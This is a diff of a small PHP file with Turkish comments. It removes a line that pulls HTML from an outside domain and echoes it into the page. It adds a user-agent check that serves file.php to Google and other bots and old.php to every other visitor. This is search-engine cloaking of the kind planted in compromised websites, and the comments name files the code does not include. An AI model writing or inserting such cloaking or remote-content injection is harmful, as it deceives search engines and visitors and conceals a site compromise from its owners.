@@ -1,3 +1,14 @@
 <?php
-$a = file_get_contents( 'https://prashetyaquality.com/readme.html' ); echo $a;
+// Kullanici IP'si ve User-Agent'i kontrol et
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$is_mobile = preg_match('/(iphone|ipod|android|blackberry|windows phone)/i', $user_agent); // Mobil cihaz kontrolü
+
+// Google ile ilgili user-agent kontrolleri
+if (stripos($user_agent, 'google') !== false || stripos($user_agent, 'bot') !== false) {
+    include('file.php');  // Google bot ise google.php göster
+} elseif ($is_mobile) {
+    include('old.php');  // Mobil cihaz ise kullanici.php göster
+} else {
+    include('old.php');  // Diger durumlar için default içerik
+}
 ?>
